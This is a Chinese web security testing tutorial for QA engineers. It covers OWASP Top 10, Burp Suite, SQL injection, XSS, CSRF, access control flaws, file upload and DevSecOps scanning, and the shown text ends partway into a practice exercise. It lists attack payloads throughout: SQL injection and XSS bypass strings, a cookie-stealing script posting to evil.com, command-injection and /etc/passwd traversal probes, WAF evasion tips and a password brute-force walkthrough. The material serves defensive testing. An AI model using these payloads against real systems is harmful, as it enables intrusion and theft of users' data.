---
description: Web 安全测试教程，Burp Suite、SQL 注入、XSS 和越权测试。
---
# Web 安全测试教程（软件测试人员专用）

> 本教程面向软件测试工程师，讲解 Web 安全测试的核心知识、常见漏洞原理与实战验证方法，覆盖 Burp Suite 使用、SQL 注入、XSS、越权等高频安全测试场景。

<div class="tutorial-meta">
    <span class="difficulty-badge difficulty-intermediate">📙 进阶难度</span>
    <span class="meta-item">⏱ 约 2 天</span>
    <span class="meta-item">📋 前置：HTTP 协议、接口测试基础</span>
    <span class="meta-item">🎯 目标：掌握常见 Web 漏洞的测试方法</span>
</div>

| 项目 | 要求 | 获取方式 |
|------|------|----------|
| HTTP 协议 | 了解请求方法、状态码、请求头与响应体 | [网络知识教程-软件测试版](../工具操作/网络知识教程-软件测试版.md) |
| 接口测试基础 | 了解接口测试流程、用例设计方法 | [接口测试完整教程-软件测试版](../专项测试/接口测试完整教程-软件测试版.md) |

---

## 新手导读

安全测试对新手来说不要一开始追求“攻击技巧”。测试人员更应该先建立风险意识：哪些输入不可信、哪些接口需要权限、哪些数据不能泄露。

第一遍重点掌握：

1. 越权：能不能访问别人的数据。
2. SQL 注入：输入是否被当成 SQL 执行。
3. XSS：输入是否被当成页面脚本执行。
4. 敏感信息泄露：密码、Token、身份证等是否暴露。
5. 安全测试必须在授权环境进行。

不要在真实网站或未授权系统上练习攻击类操作。

### 版本与维护说明

| 项目 | 说明 |
|------|------|
| 适用范围 | Web 安全基础、OWASP Top 10、Burp Suite、接口安全验证 |
| 使用建议 | 只在授权测试环境练习，优先验证越权、认证、敏感信息和输入校验 |
| 更新提醒 | OWASP 分类、Burp 菜单和浏览器安全策略会变化，正式测试前核对官方资料和团队安全规范 |

---
## 一、安全测试基础

### 1.1 测试人员为什么要学安全

- 接口暴露面越来越大（微服务、开放平台）
- 安全漏洞修复成本随阶段递增
- 测试是上线前最后防线
- 安全测试能力是高级测试工程师的必备技能

### 1.2 OWASP Top 10（2021）

| 排名 | 风险 | 说明 |
|------|------|------|
| A01 | 失效的访问控制 | 越权、IDOR（通过改 URL 中的 ID 访问他人数据） |
| A02 | 加密失败（Cryptographic Failures） | 敏感数据明文传输/存储 |
| A03 | 注入 | SQL、XSS、命令注入 |
| A04 | 不安全设计 | 架构层面缺陷 |
| A05 | 安全配置错误 | 默认密码、调试端口暴露 |
| A06 | 脆弱过时组件 | 旧版本依赖 |
| A07 | 身份验证失败（Identification and Authentication Failures） | 弱密码、暴力破解 |
| A08 | 软件和数据完整性失败 | 未验证的更新/CI |
| A09 | 日志和监控不足 | 无法发现攻击 |
| A10 | SSRF | 服务端请求伪造 |

### 1.3 测试人员的安全测试范围

```
开发负责：代码安全（输入校验、参数化查询、加密存储）
测试负责：黑盒验证（接口参数篡改、越权、注入、信息泄露）
安全团队：渗透测试、代码审计、漏洞扫描
```

测试人员重点做 **黑盒安全验证**，不需要写漏洞利用代码。

### 1.4 OWASP WSTG 测试框架映射

OWASP WSTG（Web Security Testing Guide）更像一份 Web 安全测试清单。新手可以不一次性学完全部细节，但要知道安全测试不只包含 SQL 注入和 XSS。

| WSTG 类别 | 测试人员要关注什么 | 常见验证方式 |
|-----------|--------------------|--------------|
| 信息收集 | 系统暴露了哪些入口、接口、版本、错误信息 | 浏览器 DevTools、Burp History、响应头检查 |
| 配置与部署管理 | 默认配置、调试页面、目录暴露、服务版本 | 访问常见路径、检查响应头、查看错误页面 |
| 身份认证测试 | 登录、密码策略、验证码、锁定、找回密码 | 错误密码、弱密码、验证码重放、锁定规则 |
| 会话管理测试 | Cookie、Session、Token 是否安全 | 退出后旧 token、过期 token、Cookie 属性 |
| 授权测试 | 普通用户能否访问他人数据或管理员接口 | 改 ID、换 token、直接请求隐藏接口 |
| 输入验证测试 | SQL 注入、XSS、命令注入、文件上传 | 特殊字符、脚本、非法文件、参数篡改 |
| 错误处理测试 | 报错是否泄露路径、SQL、堆栈、密钥 | 构造异常参数，观察错误响应 |
| 加密测试 | HTTPS、敏感信息传输和存储是否安全 | 抓包查看明文、检查证书和传输协议 |
| 业务逻辑测试 | 业务流程是否可绕过 | 重复提交、跳步、篡改金额、重复回调 |
| 客户端测试 | 前端存储、DOM XSS、跨域、点击劫持 | LocalStorage、CORS、iframe、前端脚本 |
| API 测试 | 接口鉴权、限流、数据暴露、参数校验 | Postman/Burp 重放、越权、批量请求 |

使用方式：

```text
第一步：列出本次功能涉及的入口和接口。
第二步：按 WSTG 类别筛出相关测试项。
第三步：为每个测试项准备数据和账号。
第四步：执行验证并保留请求、响应、截图和日志。
第五步：把高风险问题写成缺陷，把不确定点写成风险或疑问。
```

### 1.5 WSTG 落地示例：订单详情接口

目标接口：

```text
GET /api/orders/{orderId}
```

安全测试映射：

| WSTG 类别 | 测试点 | 预期 |
|-----------|--------|------|
| 身份认证 | 不带 token 请求订单详情 | 返回 401 或未登录 |
| 会话管理 | 使用过期 token 请求 | 返回 401，不返回订单数据 |
| 授权测试 | 用户 A 请求用户 B 的订单 ID | 返回 403、404 或无权限 |
| 输入验证 | orderId 传入字母、超长数字、特殊字符 | 返回参数错误，不报堆栈 |
| 错误处理 | 请求不存在订单 ID | 不泄露数据库 SQL 或服务路径 |
| 业务逻辑 | 已取消订单是否还能支付 | 不允许非法状态操作 |
| API 测试 | 批量枚举订单 ID | 有权限校验和必要限流 |

缺陷示例：

| 字段 | 内容 |
|------|------|
| 标题 | 普通用户可通过修改订单 ID 查看他人订单详情 |
| 严重级别 | Critical |
| 复现步骤 | 用户 A 登录后请求 `/api/orders/用户B订单ID` |
| 实际结果 | 返回用户 B 的订单金额、地址和手机号 |
| 期望结果 | 返回无权限，不返回任何用户 B 数据 |
| WSTG 分类 | 授权测试 / 水平越权 |

### 1.6 安全测试计划模板

```text
测试对象：
测试环境：
授权范围：
测试账号：
涉及接口：
不允许操作：

测试类别：
- 身份认证
- 会话管理
- 授权
- 输入验证
- 错误处理
- 业务逻辑
- 敏感信息

输出物：
- 安全测试记录
- 缺陷报告
- 风险清单
- 待确认问题
```

安全测试必须明确授权范围。没有授权的系统，即使只是“试一下”，也不要做攻击类验证。

---

## 二、Burp Suite 入门

### 2.1 什么是 Burp Suite

Burp Suite 是 Web 安全测试的 **核心工具**，功能：

- **Proxy**：拦截 HTTP/HTTPS 请求（类似 Fiddler，但更强大）
- **Repeater**：手动重放修改请求
- **Intruder**：自动化攻击（爆破、注入）
- **Scanner**：漏洞扫描（Pro 版）

### 2.2 安装

- 下载 Community Edition（免费）：`https://portswigger.net/burp/communitydownload`
- 需要 JDK 17+
- 安装后启动，选 Temporary Project → Next → Start Burp

### 2.3 配置浏览器代理

1. Burp 默认监听 `127.0.0.1:8080`
2. 浏览器配置代理：`127.0.0.1:8080`
3. 访问 `http://burp` 下载 CA 证书并安装
4. 浏览器访问 HTTPS 网站不再报证书错误

> 推荐用 **FoxyProxy** 浏览器扩展快速切换代理。

### 2.4 核心功能

**Proxy（代理拦截）：**

- 拦截请求，修改后放行
- HTTP history 查看所有请求

**Repeater（重放器）：**

- 拖入请求，修改参数，手动发送
- 观察响应变化

**Intruder（入侵器）：**

- 标记攻击位置（如密码字段）
- 加载字典（一个包含成千上万常用密码的文件，如 "123456"、"password"、"admin"）
- 自动逐个尝试，分析结果

> ⚠️ 字典爆破只能用于你有权限测试的系统，未经授权的暴力破解是违法的。

---

## 三、SQL 注入

### 3.1 原理

应用把用户输入直接拼接到 SQL 语句中，攻击者可插入 SQL 代码改变查询逻辑。

```python
# 不安全：字符串拼接
sql = f"SELECT * FROM users WHERE name = '{username}' AND pwd = '{password}'"

# 用户输入 username = "admin' OR '1'='1"
# 拼接后：SELECT * FROM users WHERE name = 'admin' OR '1'='1' AND pwd = ''
# 结果：绕过登录
```

> 为什么能绕过？正常 SQL 要 `name='admin' AND pwd='xxx'` 两个条件都成立。攻击者输入的 `'1'='1'` 永远为真，加上 `OR` 后整个条件变成"只要 name 是 admin 或 1=1 就行"——1=1 永远成立，所以不需要密码就能查出数据。

### 3.2 测试方法

**手动验证：**

在输入框或接口参数中输入：

```
' OR '1'='1
' OR 1=1--
admin' --
' UNION SELECT 1,2,3--
```

**观察响应：**

- 登录成功（绕过认证）→ 注入成功
- 返回数据异常多 → 注入成功
- 报错信息含 SQL 语句 → 存在注入点
- 响应时间异常（时间盲注）→ 可能存在注入

### 3.3 常见 Payload

```sql
-- 绕过登录
' OR '1'='1
' OR 1=1--
admin' --

-- 判断列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    -- 报错说明只有 2 列

-- UNION 查询
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--

-- 时间盲注
' OR SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0) --

-- 报错注入
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
```

### 3.4 防御验证

测试时验证开发是否用了参数化查询：

```python
# ✅ 安全：参数化查询
cursor.execute("SELECT * FROM users WHERE name = %s", (username,))

# ❌ 不安全：字符串拼接
cursor.execute(f"SELECT * FROM users WHERE name = '{username}'")
```

---

## 四、XSS 跨站脚本

### 4.1 原理

应用把用户输入未转义就输出到页面，攻击者注入恶意脚本。

**类型：**

- **反射型**：输入在 URL 中，点击触发
- **存储型**：输入存数据库，所有人访问都触发（最危险）
- **DOM 型**：前端 JS 处理不当

### 4.2 测试方法

在输入框、URL 参数、评论区等输入：

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

**观察：**

- 弹出 alert 框 → XSS 成功
- 查看页面源码，恶意代码是否被原样输出

### 4.3 测试 Payload

```html
<!-- 基础 -->
<script>alert(1)</script>

<!-- 绕过简单过滤 -->
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>

<!-- 窃取 Cookie -->
<script>new Image().src="http://evil.com/?c="+document.cookie</script>

<!-- DOM 型 -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

### 4.4 防御验证

检查输出是否被转义：

```html
<!-- ✅ 安全：特殊字符被转义 -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- ❌ 不安全：原样输出 -->
<script>alert(1)</script>
```

---

## 五、CSRF 跨站请求伪造

### 5.1 原理

诱导已登录用户访问恶意页面，利用用户的登录态发起请求。浏览器会自动把目标网站的 Cookie 带上——不管你从哪个页面发起请求，只要是发往 bank.com，浏览器就会带上 bank.com 的 Cookie。CSRF 就是利用了这个机制。

```
用户已登录 bank.com
→ 访问恶意页面 evil.com
→ evil.com 页面自动发起请求 bank.com/transfer?to=hacker&amount=10000
→ 浏览器自动带上 bank.com 的 Cookie
→ 转账成功
```

### 5.2 测试方法

1. 登录目标网站，获取一个操作请求（如修改密码）
2. 构造恶意 HTML：

```html
<img src="http://target.com/change-password?new=123456">
```

3. 在另一个浏览器（或无痕窗口）打开该 HTML
4. 如果密码被修改 → CSRF 成功

**用 Burp 测试：**

- 在 Repeater 中去掉 Referer / Token 头
- 如果请求仍然成功 → 缺少 CSRF 防护

### 5.3 防御验证

检查是否有：

- CSRF Token（每次请求带随机 token）
- Referer / Origin 校验
- SameSite Cookie 属性

---

## 六、越权访问

### 6.1 水平越权（IDOR）

用户 A 访问用户 B 的资源。

```
正常：GET /api/user/1001/info  （用户 A 的 ID 是 1001）
越权：GET /api/user/1002/info  （改成用户 B 的 ID）
→ 如果返回用户 B 的信息 → 水平越权漏洞
```

**测试步骤：**

1. 用用户 A 登录，抓取请求
2. 修改请求中的用户 ID / 订单 ID 为用户 B 的
3. 观察是否返回 B 的数据

### 6.2 垂直越权

普通用户访问管理员接口。

```
普通用户 Token + 管理员接口：
POST /api/admin/deleteUser
Headers: Authorization: Bearer <普通用户Token>
Body: {"userId": 1001}

→ 如果用户被删除 → 垂直越权漏洞
```

### 6.3 测试要点

| 场景 | 测试方法 |
|------|---------|
| 查看他人数据 | 修改 URL 中的 ID |
| 操作他人资源 | 用 A 的 Token 操作 B 的资源 |
| 访问管理接口 | 用普通用户 Token 调管理接口 |
| 绕过前端限制 | 直接调接口（不经过页面按钮） |

---

## 七、敏感信息泄露

### 7.1 常见泄露点

| 泄露点 | 测试方法 |
|--------|---------|
| 接口返回多余字段 | 检查响应是否含手机号、身份证、密码 |
| 错误信息 | 故意触发错误，看是否暴露 SQL/堆栈/路径 |
| 前端源码 | F12 查看 JS 中是否有硬编码密钥 |
| 接口文档 | 尝试访问 /swagger-ui.html、/api-docs |
| 备份文件 | 尝试访问 .bak、.sql、.zip |
| Git 泄露 | 尝试访问 /.git/ |
| 默认页面 | 尝试访问 /actuator、/druid |

### 7.2 测试检查清单

- [ ] 响应中的敏感字段（密码、手机号、身份证）是否脱敏
- [ ] 错误信息是否暴露技术细节
- [ ] 前端 JS 中是否有密钥/Token
- [ ] 接口文档是否对外暴露
- [ ] HTTP 响应头是否泄露服务器信息（Server、X-Powered-By）
- [ ] 是否有 debug 模式开启

---

## 八、文件上传漏洞

### 8.1 测试要点

| 场景 | 测试方法 |
|------|---------|
| 绕过前端校验 | 直接用 Burp 修改请求上传 |
| 修改文件类型 | 改 Content-Type（如 image/jpeg） |
| 双扩展名 | test.php.jpg |
| 大小写绕过 | test.pHp |
| 00 截断 | test.php%00.jpg（旧系统中 %00 会截断文件名，实际存为 test.php） |
| 图片马 | 合法图片中嵌入恶意代码，如果服务器执行了这个"图片"就会中招 |
| 超大文件 | 上传 GB 级文件测试 DoS |

### 8.2 测试步骤

1. 正常上传一个 .jpg → 成功
2. 用 Burp 拦截，把文件名改为 `.php` → 看是否拒绝
3. 把 Content-Type 改为 `image/jpeg` → 看是否绕过
4. 上传包含恶意代码的图片 → 看是否被执行

---

## 九、接口安全测试

### 9.1 高频测试场景

| 场景 | 测试方法 |
|------|---------|
| 未认证访问 | 不带 Token 调接口 |
| Token 过期 | 用过期 Token |
| Token 篡改 | 修改 Token 中几位 |
| 暴力破解 | 用 Intruder 跑密码字典 |
| 短信轰炸 | 重放发送验证码接口 |
| 金额篡改 | 修改价格/金额参数 |
| 数量篡改 | 修改购买数量为负数/小数 |
| 重复提交 | 快速重放同一请求 |

### 9.2 Burp Intruder 爆破示例

1. 拦截登录请求
2. 发送到 Intruder
3. 标记密码字段为攻击位置 `$password$`
4. 加载密码字典（如 rockyou.txt）
5. 开始攻击
6. 按响应长度/状态码筛选正确密码——登录失败通常返回短错误提示，成功则返回用户数据和 Token（响应更长），按长度排序就能找到密码

### 9.3 验证限流

=== "Linux / Mac"

    ```bash
    for i in $(seq 1 100); do
      curl -s -o /dev/null -w "%{http_code}\n" \
        -X POST http://api.example.com/send-sms \
        -d '{"phone":"13800138000"}'
    done
    # 如果全部返回 200 → 无限流，存在短信轰炸风险
    ```

=== "Windows PowerShell"

    ```powershell
    1..100 | ForEach-Object {
      $r = Invoke-WebRequest -Uri "http://api.example.com/send-sms" -Method POST -Body '{"phone":"13800138000"}' -ContentType "application/json"
      Write-Output $r.StatusCode
    }
    ```

---

## 十、安全测试 Checklist

### 10.1 认证与授权

- [ ] 未认证访问需登录的接口 → 应返回 401
- [ ] 用过期 Token 访问 → 应返回 401
- [ ] 水平越权：用 A 的 Token 访问 B 的数据
- [ ] 垂直越权：用普通用户访问管理接口
- [ ] 密码是否加密传输（HTTPS）
- [ ] 登录失败是否有次数限制
- [ ] 是否有验证码防爆破

### 10.2 注入

- [ ] SQL 注入：输入 `' OR '1'='1`
- [ ] XSS：输入 `<script>alert(1)</script>`
- [ ] 命令注入：输入 `; ls`
- [ ] 路径遍历：输入 `../../etc/passwd`

### 10.3 数据安全

- [ ] 响应中敏感字段是否脱敏
- [ ] 是否有 HTTPS
- [ ] Cookie 是否有 Secure/HttpOnly 标志
- [ ] 密码是否明文存储（看数据库）

### 10.4 接口安全

- [ ] 高频调用是否限流
- [ ] 关键操作是否有幂等控制
- [ ] 文件上传类型/大小是否校验
- [ ] 接口文档是否对外暴露

### 10.5 配置安全

- [ ] 是否有默认密码
- [ ] debug 模式是否关闭
- [ ] 不必要的端口是否关闭
- [ ] 错误信息是否暴露技术细节

---

## 十一、常见问题排查

### 11.1 Burp 抓不到 HTTPS

- 安装 Burp CA 证书到浏览器/系统
- 检查代理设置是否正确
- 某些 App 有证书锁定，需配合 Frida

### 11.2 注入 Payload 被拦截

- WAF/防火墙可能拦截了关键字
- 尝试编码绕过（URL 编码、Unicode）
- 尝试大小写混合
- 尝试注释符分割：`UN/**/ION SEL/**/ECT`

### 11.3 不确定是否是漏洞

- 手动复现确认
- 查看 OWASP 官方定义
- 与开发沟通确认预期行为
- 不确定就提 Bug，让安全团队评审

### 11.4 安全测试的边界

- **测试环境测试**，不要对生产系统做注入
- 不要真的窃取数据
- 不要做 DoS 攻击（压测是另一回事）
- 发现漏洞后报告，不要利用

---

## 附录：安全测试工具

| 工具 | 用途 |
|------|------|
| **Burp Suite** | Web 安全测试核心 |
| **sqlmap** | 自动化 SQL 注入 |
| **Nmap** | 端口扫描 |
| **OWASP ZAP** | 免费 Web 安全扫描 |
| **Nikto** | Web 服务器扫描 |
| **dirb / dirsearch** | 目录枚举 |
| **Postman** | 接口安全测试 |

---

!!! info "测试纪律"
    安全测试必须在授权环境下进行。禁止对未授权系统进行渗透测试。发现的安全漏洞需及时上报，不得利用或传播。

## 十四、DevSecOps 集成

> 安全不应该在上线前才想起来，而应该融入整个开发流程——这就是 **DevSecOps（开发-安全-运维一体化）** 的核心理念。

### 14.1 什么是 DevSecOps

传统模式：开发完 → 测试完 → 最后才做安全检查 → 发现漏洞 → 返工（成本极高）

DevSecOps 模式：**安全左移**（Shift Left），在开发的每个阶段都嵌入安全检查：

| 阶段 | 传统做法 | DevSecOps 做法 |
|------|---------|---------------|
| 编码 | 不管安全 | IDE 安全插件实时提示 |
| 提交 | 不管安全 | Git Hooks 扫描密钥泄露 |
| 构建 | 不管安全 | SAST 静态扫描 + SCA 依赖检查 |
| 测试 | 上线前才查 | DAST 动态扫描 |
| 部署 | 手动检查 | 自动化安全门禁 |
| 运行 | 出事才响应 | 运行时监控 + WAF |

### 14.2 DevSecOps 流程图

```
代码提交 → 代码扫描(SAST) → 构建 → 依赖扫描(SCA) → 部署 → 动态扫描(DAST) → 运行时监控
   │            │              │          │              │          │              │
   │        SonarQube        Docker    Snyk/npm       K8s/云    OWASP ZAP      WAF/SIEM
   │        Semgrep          CI/CD     audit                                   日志告警
   └── git-secrets ──────────────────────────────────────────────────────────────────────┘
```

---

### 14.3 SAST（静态应用安全测试）

**原理**：在源码阶段发现安全问题，不需要运行程序。就像代码审查，但是自动化。

**常用工具**：

| 工具 | 特点 | 适用场景 |
|------|------|---------|
| **SonarQube** | 综合代码质量+安全 | Java/JS/Python 等多语言 |
| **Semgrep** | 轻量、规则灵活 | 团队自定义安全规则 |
| **Bandit** | Python 专用 | Python 项目安全扫描 |

**CI/CD 集成示例（GitLab CI）**：

```yaml
# .gitlab-ci.yml
sast-scan:
  stage: test
  image: python:3.11
  script:
    # Bandit 扫描 Python 代码安全问题
    - pip install bandit
    - bandit -r src/ -f json -o bandit-report.json
    # 如果发现高危漏洞则阻断流水线
    - bandit -r src/ --severity-level high --exit-code 1
  artifacts:
    paths:
      - bandit-report.json
```

**Semgrep 示例**：

```yaml
# .gitlab-ci.yml
semgrep-scan:
  stage: test
  image: semgrep/semgrep
  script:
    # 使用 OWASP 规则集扫描
    - semgrep --config=p/owasp-top-ten --json -o semgrep-report.json src/
  artifacts:
    paths:
      - semgrep-report.json
```

**常见扫描结果解读**：

```
Bandit 示例输出：
Issue: [B105:hardcoded_password_string] Possible hardcoded password
Severity: Medium   Confidence: Medium
File: src/config.py  Line: 15
→ 含义：代码中发现了硬编码的密码字符串，建议用环境变量替代
```

---

### 14.4 DAST（动态应用安全测试）

**原理**：在运行时扫描安全漏洞，不需要源码。像一个自动化黑客，对你的应用发各种攻击请求。

**常用工具**：

| 工具 | 特点 | 适用场景 |
|------|------|---------|
| **OWASP ZAP** | 免费开源 | CI/CD 自动化扫描 |
| **Burp Suite** | 功能全面 | 手动+自动化测试 |
| **Nuclei** | 模板化扫描 | 快速漏洞验证 |

**OWASP ZAP 自动化扫描配置**：

```bash
# 安装 ZAP（Docker 方式）
docker pull ghcr.io/zaproxy/zaproxy:stable

# 全自动扫描（适合 CI/CD）
docker run --rm \
  -v $(pwd)/report:/zap/wrk \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py \
  -t http://target-app:8080 \
  -r report.html \
  -x report.xml

# 只爬虫+扫描 API（更快）
docker run --rm \
  -v $(pwd)/report:/zap/wrk \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-api-scan.py \
  -t http://target-app:8080/api/swagger.json \
  -f openapi \
  -r api-report.html
```

**CI/CD 集成示例（GitLab CI）**：

```yaml
# .gitlab-ci.yml
dast-scan:
  stage: security
  image: ghcr.io/zaproxy/zaproxy:stable
  script:
    - zap-full-scan.py -t $TARGET_URL -r report.html -x report.xml
  artifacts:
    paths:
      - report.html
      - report.xml
  allow_failure: true  # DAST 扫描可能有误报，不阻断流水线
```

---

### 14.5 SCA（软件成分分析）

**原理**：检查项目依赖的第三方库是否有已知安全漏洞。你的代码没问题，但你引用的库可能有漏洞。

**真实案例**：

- **Log4Shell (2021)**：Log4j 远程代码执行漏洞，影响全球 35000+ Java 项目
- **event-stream (2018)**：npm 包被注入恶意代码，窃取比特币钱包

**常用工具**：

| 工具 | 适用 | 特点 |
|------|------|------|
| **Snyk** | 多语言 | 有免费版，自动修复建议 |
| **Dependabot** | GitHub | 自动创建 PR 修复漏洞 |
| **pip-audit** | Python | 轻量命令行工具 |
| **npm audit** | Node.js | 内置在 npm 中 |
| **Trivy** | 容器+代码 | 扫描镜像和文件系统 |

**实战：在 CI 中集成依赖扫描**：

```bash
# Python - pip-audit
pip install pip-audit
pip-audit  # 检查 requirements.txt 中的漏洞

# Node.js - npm audit
npm audit          # 显示漏洞
npm audit fix      # 自动修复
npm audit --json   # 输出 JSON 报告
```

```yaml
# .gitlab-ci.yml - 依赖扫描
dependency-scan:
  stage: security
  script:
    # Python 项目
    - pip install pip-audit
    - pip-audit --strict --desc
    # 如果有 high/critical 漏洞则失败
  allow_failure: false  # 依赖漏洞必须修复
```

**Snyk CI/CD 集成**：

```yaml
# .gitlab-ci.yml
snyk-scan:
  stage: security
  image: snyk/snyk:python
  script:
    - snyk test --severity-threshold=high
  variables:
    SNYK_TOKEN: $SNYK_API_TOKEN  # 在 CI/CD 变量中配置
```

---

### 14.6 密钥与敏感信息管理

**❌ 错误做法——把密钥写在代码里**：

```python
# 千万不要这样写！
DATABASE_PASSWORD = "MyS3cretPass"
API_KEY = "sk-1234567890abcdef"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
```

**✅ 正确做法**：

```python
# 方法1：环境变量
import os
DB_PASSWORD = os.environ.get("DATABASE_PASSWORD")
API_KEY = os.environ.get("API_KEY")

# 方法2：.env 文件（不要提交到 Git！）
# .env 文件加入 .gitignore
from dotenv import load_dotenv
load_dotenv()
API_KEY = os.environ.get("API_KEY")
```

**密钥管理服务**：

| 服务 | 适用场景 |
|------|---------|
| **HashiCorp Vault** | 自建密钥管理 |
| **AWS Secrets Manager** | AWS 云环境 |
| **Azure Key Vault** | Azure 云环境 |
| **GCP Secret Manager** | GCP 云环境 |

**git-secrets 扫描**：

```bash
# 安装 git-secrets
# Mac
brew install git-secrets
# Linux
git clone https://github.com/awslabs/git-secrets.git
cd git-secrets && sudo make install

# 在项目中配置
git secrets --install
git secrets --register-aws  # 添加 AWS 密钥模式

# 扫描整个仓库历史
git secrets --scan-history

# 手动添加自定义模式
git secrets --add 'password\s*=\s*.+'
git secrets --add 'api_key\s*=\s*.+'
```

**CI/CD 密钥扫描**：

```yaml
# .gitlab-ci.yml
secret-scan:
  stage: security
  script:
    # 使用 gitleaks 扫描 Git 历史中的密钥
    - docker run --rm -v $(pwd):/path zricethezav/gitleaks detect --source=/path --report-path=/path/gitleaks-report.json
  artifacts:
    paths:
      - gitleaks-report.json
```

---

### 14.7 安全测试在 CI/CD 中的落地

**质量门禁配置示例**：

```yaml
# .gitlab-ci.yml - 完整安全流水线
stages:
  - build
  - test
  - security
  - deploy

# 代码扫描（每次提交）
sast:
  stage: security
  script:
    - bandit -r src/ --severity-level high --exit-code 1
  rules:
    - if: $CI_MERGE_REQUEST_IID  # 只在 MR 时运行

# 依赖扫描（每次提交）
dependency-check:
  stage: security
  script:
    - pip-audit --strict
  rules:
    - if: $CI_MERGE_REQUEST_IID

# 密钥扫描（每次提交）
secret-detection:
  stage: security
  script:
    - gitleaks detect --source=. --exit-code 1

# DAST 扫描（部署到测试环境后）
dast:
  stage: security
  needs: ["deploy-to-staging"]
  script:
    - zap-full-scan.py -t $STAGING_URL -r report.html
  rules:
    - if: $CI_COMMIT_BRANCH == "main"

# 安全门禁：必须全部通过才能部署到生产
deploy-to-production:
  stage: deploy
  needs: ["sast", "dependency-check", "secret-detection", "dast"]
  script:
    - echo "All security checks passed, deploying to production..."
```

**安全扫描报告解读**：

```
漏洞优先级 = 严重程度（CVSS评分）× 可利用性 × 业务影响

CVSS 评分标准：
┌──────────┬──────────┬─────────────────────────┐
│  评分范围  │   等级   │         处理方式          │
├──────────┼──────────┼─────────────────────────┤
│ 9.0 - 10 │ Critical │ 必须立即修复，阻断发布    │
│ 7.0 - 8.9│   High   │ 24小时内修复             │
│ 4.0 - 6.9│  Medium  │ 一周内修复，记入待办      │
│ 0.1 - 3.9│   Low    │ 下个迭代修复             │
│    0     │   Info   │ 仅记录，不需要修复        │
└──────────┴──────────┴─────────────────────────┘
```

**安全门禁策略建议**：

```
Critical / High  → 阻断流水线，不允许合并/发布
Medium           → 警告但不阻断，创建 Issue 跟踪
Low / Info       → 仅在报告中记录
```

---

### 14.8 DevSecOps 工具链总结

```
┌─────────────────────────────────────────────────────────┐
│                    DevSecOps 工具链                       │
├──────────┬──────────────┬───────────────────────────────┤
│   阶段    │    工具       │           作用                │
├──────────┼──────────────┼───────────────────────────────┤
│  编码     │ IDE 插件      │ 实时安全提示                  │
│  提交     │ git-secrets  │ 防止密钥提交                  │
│  SAST    │ Semgrep      │ 代码安全扫描                  │
│  SCA     │ Snyk         │ 依赖漏洞检查                  │
│  DAST    │ OWASP ZAP    │ 运行时安全扫描                │
│  容器安全 │ Trivy        │ 镜像漏洞扫描                  │
│  运行时   │ WAF + SIEM   │ 实时监控与告警                │
└──────────┴──────────────┴───────────────────────────────┘
```

> 💡 **给测试工程师的建议**：DevSecOps 不是让测试人员一个人扛所有安全工作，而是让整个团队（开发、测试、运维）共同参与安全。测试工程师在其中的角色是：**推动安全测试落地、解读扫描报告、验证漏洞修复**。

---

## 动手任务：订单接口安全评审——分清「真漏洞」与「扫描器误报」

> 这是本教程的收尾练习。请**独立完成**，不要先看参考答案。目标是**判定风险并说清影响**，不是"会用工具扫一下"。

### 任务背景

你被安排对即将上线的「订单中心」做上线前安全回归。开发同学交来一份自查结论：**"接口已做过扫描，输出里只有两条中危：CORS 配置过宽、响应头暴露了中间件版本，已排期下个迭代修。"**

这批接口里其实藏着一个足以批量拖走全站订单的高危问题，却被扫描器漏掉了；而开发列出的那两条，一条是**真问题但危害被低估**，另一条是**纯粹的误报**。你的任务不是"再跑一遍扫描器"，而是**用证据说清哪一条真、哪一条假，以及"真"的那条到底能造成多大后果**。

> 注意：本任务所有数据均为教学构造，请只在授权测试环境复现。

### 任务准备

**测试账号（两个普通用户）**

```
用户 A：userId = 1001，用户名 tester_a
用户 B：userId = 1002，用户名 tester_b
```

**用户 A 的登录令牌（JWT，三段结构 header.payload.signature）**

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwidXNlcklkIjoxMDAxLCJyb2xlIjoidXNlciIsImV4cCI6MTg5MzQ1NjAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

用户 A 的 payload 解码后为：

```json
{"sub":"1001","userId":1001,"role":"user","exp":1893456000}
```

用户 B 的 payload（仅用于对照）解码后为：

```json
{"sub":"1002","userId":1002,"role":"user","exp":1893456000}
```

> 提示：JWT 的前两段是 **Base64URL 编码**（可逆、无密钥），但第三段是用服务端密钥对前两段做的**签名**。改 payload 而不重新签名会导致签名校验失败——这正是"Base64 可读"不等于"令牌可篡改"的关键区别。

**请求 1：订单详情（用户 A 查自己的订单 ORD-20260301-0001）**

```http
GET /api/orders/ORD-20260301-0001 HTTP/1.1
Host: api.shop-test.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwidXNlcklkIjoxMDAxLCJyb2xlIjoidXNlciIsImV4cCI6MTg5MzQ1NjAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Accept: application/json
```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-store
Server: nginx/1.24.0
X-Powered-By: Express
Access-Control-Allow-Origin: https://m.shop-test.example.com
Access-Control-Allow-Credentials: true
Vary: Origin
Set-Cookie: sid=eyJ1IjoxMDAxfQ; Path=/; SameSite=Lax

{"orderId":"ORD-20260301-0001","ownerUserId":1001,"status":"paid","amount":1299.00,
 "receiver":"张*","phone":"MTM4MDAxMzgwMDA=","address":"杭州市西湖区**路 18 号",
 "items":[{"skuId":101,"qty":1,"price":1299.00}]}
```

**请求 2：把订单号换成用户 B 的订单（其余一字不改）**

```http
GET /api/orders/ORD-20260301-0002 HTTP/1.1
